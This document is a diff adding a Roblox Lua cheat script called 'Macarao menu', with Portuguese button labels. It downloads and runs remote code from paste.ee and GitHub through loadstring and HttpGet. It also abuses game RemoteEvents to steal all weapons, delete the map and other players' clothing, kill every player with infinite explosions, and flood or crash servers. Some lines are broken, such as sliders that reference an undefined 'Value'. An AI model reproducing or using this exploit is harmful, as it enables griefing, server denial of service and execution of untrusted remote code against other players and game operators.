@@ -1,0 +1,298 @@
+local ui_link = "https://paste.ee/r/OVrfb"
+
+local a = loadstring(game:HttpGet(ui_link))()
+
+local a = a:Window("Macarao menu")
+
+local HomePage = a:Tab("Armas", "rbxassetid://17205794626")
+
+HomePage:Seperator("Armas")
+
+HomePage:Button("Puxar todas as armas",function()
+            for i, v in pairs(game:GetDescendants()) do
+            if v:IsA('Tool') then
+                v.Parent = game:GetService('Players').LocalPlayer.Backpack
+            end
+        end
+        
+        game:GetService('Players').LocalPlayer.Character.Humanoid.Died:Connect(function()
+            for i, v in pairs(game:GetService('Players').LocalPlayer.Backpack:GetDescendants()) do
+                if v:IsA('Tool') then
+                    v.Parent = game:GetService('Teams')
+                end
+            end
+            for i, v in pairs(game:GetService('Players').LocalPlayer.Character:GetDescendants()) do
+                if v:IsA('Tool') then
+                    v.Parent = game:GetService('Teams')
+                end
+            end
+        end)
+end)
+
+HomePage:Button("Puxar uma arma",function()
+            for i,v in game.Players:GetDescendants() do
+            if v:IsA("Tool") then
+            v.Parent = game.Players.LocalPlayer.Backpack
+            end
+            end
+
+end)
+
+HomePage:Seperator("Personagem")
+
+HomePage:Slider("Speed",1,100,25,function(v)
+    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = Value
+end)
+
+HomePage:Slider("JumpPower",1,100,25,function(v)
+    game.Players.LocalPlayer.Character.Humanoid.PowerJump = Value
+end)
+
+HomePage:Seperator("Opção das armas")
+
+HomePage:Button("Bala Explosiva",function()
+            for i,v in pairs(game:GetService("Players").LocalPlayer.Backpack:GetDescendants()) do
+			if v:IsA("ModuleScript") and v.Name == "Settings" then
+				local a = require(v)	
+				a.ExplosiveHit = true
+				a.Expradius = 50
+			end
+		end
+end)
+
+local HomePage = a:Tab("Destruição", "rbxassetid://17205794626")
+
+HomePage:Seperator("Destruição")
+
+HomePage:Button("Colocar audio no mapa",function()
+                --// AC6_Sound and Lights_FE, AC6_Sound faz voce colocar som no jogo, Lights_FE faz voce pintar o mapa e mudar a transparencia da part
+local lib =  loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/Consistt/Ui/main/UnLeaked"))()
+local sound
+local pith
+local volume
+
+lib.title = "Main"
+
+local Main = lib:Init()
+local tab1 = Main:NewTab("FE Sound")
+local Section1 = tab1:NewSection("Main")
+
+tab1:NewTextbox("Sound Id","", "xxx", "all", "small", true, false, function(id)
+   sound = 'rbxassetid://'..id
+end)
+
+tab1:NewSlider("Pith", "",true,"/",{min = 0, max = 10, default = 0}, function(max)
+    pith = max
+end)
+
+tab1:NewSlider("Volume", "",true,"/",{min = 0, max = 10, default = 0}, function(Volume)
+    volume = Volume
+end)
+
+local NAME = "ZEUS FPS"
+
+tab1:NewToggle("Play", false ,function(play)
+  local rmt = game:FindFirstChild("AC6_FE_Sounds", true)
+    rmt:FireServer('newSound', NAME, workspace, sound, pith, volume, true)
+    rmt:FireServer('playSound', NAME)
+   if not play then
+       rmt:FireServer("stopSound", NAME)
+   end
+end)
+
+local tab2 = Main:NewTab("Lights FE")
+local Section2 = tab2:NewSection("Main")
+
+local material
+local transparency
+local color
+
+tab2:NewTextbox("Material","", "xxx", "all", "small", true, false, function(mat)
+   material = mat
+end)
+
+tab2:NewTextbox("Color", "", "xxx", "all", "small", true, false, function(cor)
+    color = BrickColor.new(cor)
+end)
+
+tab2:NewSlider("Transparency","",true,"/",{min = 0, max = 1, default = 0}, function(t)
+    transparency = t
+end)
+
+tab2:NewButton("Pintar", function()
+local remote = game:FindFirstChild("Lights_FE", true)
+    for i, v in next, game:GetDescendants() do
+        if v:IsA("BasePart") then
+            remote:FireServer('UpdateLight', v, material, color, transparency)
+        end
+            end
+end)
+end)
+
+HomePage:Button("Mapa invisivel",function()
+        local lightEvent = workspace:FindFirstChild("FE_Lights", true) or               workspace:FindFirstChild("Lights_FE", true)
+
+    if not lightEvent then return end
+    local instances =  workspace:GetDescendants()
+
+
+    local PaintCount = 0
+
+    task.defer(function()
+        for key, value in instances do
+            local args = {
+                [1] = 'UpdateLight',
+                [2] = value,
+                [3] = Enum.Material.Asphalt,
+                [4] = BrickColor.new("Crimson"),
+                [5] = 1,
+                [6] = true,
+                [7] = 15
+            }
+            if value:IsA("BasePart") then
+                lightEvent:FireServer(unpack(args))
+                print(`{key}/{#instances} , {value.Name} `)
+            end
+            task.wait()
+        end
+    end)
+end)
+
+HomePage:Button("Puxar a rapaziada",function()
+    loadstring(game:HttpGet(("https://raw.githubusercontent.com/GameLeaks2/RobloxScripts/main/BRING%20ALL%20-%20EB'S"),true))()
+end)
+
+HomePage:Seperator("Acs 1.7.5")
+
+HomePage:Button("Deletar roupa de todos",function()
+                local rmt = game:service'ReplicatedStorage':FindFirstChild("DeleteCar")
+            for i,v in pairs(game:GetService("Workspace"):GetDescendants()) do
+                if  v:IsA("Shirt") or v:IsA("Pants")  then
+                    rmt:FireServer(v) 
+                end
+            end
+end)
+
+HomePage:Button("Deletar mapa",function()
+                local rmt = game:service'ReplicatedStorage':FindFirstChild("DeleteCar")
+            for i,v in next, workspace:GetChildren() do
+                rmt:FireServer(v)
+            end
+end)
+
+HomePage:Button("Crepper",function()
+                local rmt = game:service'ReplicatedStorage':FindFirstChild("DeleteCar")
+		for i,v in pairs(game:GetService("Workspace"):GetDescendants()) do
+			if v:IsA("SpecialMesh") or v:IsA("Shirt") or v:IsA("Pants") or v:IsA("Part") and v.Name == "Right Arm" or v.Name == "Left Arm" then
+				rmt:FireServer(v) 
+			end
+		end
+end)
+
+HomePage:Button("Lag server",function()
+                L = 20
+
+local event = game.ReplicatedStorage.ACS_Engine.Eventos.Hit
+local base = workspace:FindFirstChildOfClass("Part")
+local data
+
+for i,v in game:GetDescendants() do
+    if v:IsA("Tool") and v:FindFirstChild("ACS_Modulo") then
+        data = require(v.ACS_Modulo.ACS_Setup); break
+    end
+end
+
+shared.loop = not shared.loop
+while shared.loop do
+    for i = 1, L do
+        event:FireServer(base.Position, base, Vector3.new(), Enum.Material.Neon, data)
+    end
+    task.wait()
+end
+end)
+
+HomePage:Button("Button",function()
+            local rem,_t,players = game:GetService("ReplicatedStorage").ACS_Engine.Eventos.Hit,{ExplosiveHit=true,ExPressure=math.huge,ExpRadius=math.huge,DestroyJointRadiusPercent=math.huge,ExplosionDamage=math.huge},game:GetService('Players')
+	
+		for i,v in next, players:GetPlayers() do 
+			local ppart = v['Character'].PrimaryPart
+			pcall(function()
+				rem:FireServer(ppart.Position,ppart,ppart.Position,Enum.Material.ForceField,_t)
+			end)
+		end
+end)
+
+HomePage:Button("Btools",function()
+            local Mouse = game.Players.LocalPlayer:GetMouse()
+	
+		local Tool = Instance.new('Tool',game.Players.LocalPlayer.Backpack)
+		Tool.CanBeDropped = false
+		Tool.Name = "Destruir"
+		Tool.RequiresHandle = false 
+	
+		local rmt = game:GetService("ReplicatedStorage").DeleteCar
+	
+		Tool.Activated:connect(function() 
+			rmt:FireServer(Mouse.Target)
+		end)
+end)
+
+HomePage:Seperator("Acs 2.0.1")
+
+HomePage:Button("Building",function()
+            local cFrame = CFrame.new(0,0,0)
+
+
+        local Size = {
+         X = 1,
+         Y = 1,
+         Z = 1
+        }
+        
+        game:GetService('ReplicatedStorage')['ACS_Engine'].Eventos.Breach:InvokeServer(3,{Fortified={},Destroyable=workspace},CFrame.new(),CFrame.new(),{CFrame=game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame*cFrame,Size=Size})
+end)
+
+HomePage:Button("Bypass Building",function()
+    game:GetService('ReplicatedStorage').ACS_Engine.Events.Refil:FireServer(game.Players.LocalPlayer.Character.ACS_Client.Kit.Fortifications, -99999999)
+end)
+
+HomePage:Button("Crash server",function()
+            while task.wait() do
+
+            for _, player in next, game.Players:GetPlayers() do
+               game:GetService("ReplicatedStorage")["ACS_Engine"].Events.Suppression:FireServer(player, 666, 666, 666)
+            end
+          end
+end)
+
+HomePage:Button("Sem stamina",function()
+            local cfg = require(game:GetService('ReplicatedStorage')['ACS_Engine'].GameRules.Config)
+        cfg.EnableStamina = false
+end)
+
+HomePage:Button("Sem dano de queda",function()
+            local cfg = require(game:GetService('ReplicatedStorage')['ACS_Engine'].GameRules.Config)
+        cfg.EnableFallDamage = false
+end)
+
+HomePage:Button("Sem tempo de pulo",function()
+            local cfg = require(game:GetService('ReplicatedStorage')['ACS_Engine'].GameRules.Config)
+        cfg.AntiBunnyHop = false
+end)
+
+HomePage:Button("Value Changer",function()
+           game:GetService('ReplicatedStorage')['ACS_Engine'].Events.Refil:FireServer(game:GetService('Workspace')['virtual_rod']['ACS_Client'].Protecao.VestProtect.Value, 999)
+end)
+
+HomePage:Button("Som de hack",function()
+            while task.wait() do
+
+            for _, player in next, game.Players:GetPlayers() do
+                game:GetService('ReplicatedStorage')['ACS_Engine'].Events.Whizz:FireServer(player)
+            end
+          end
+end)
+
+local HomePage = a:Tab("Creditos", "rbxassetid://17205794626")
+
+HomePage:Seperator("Feito por macarao")
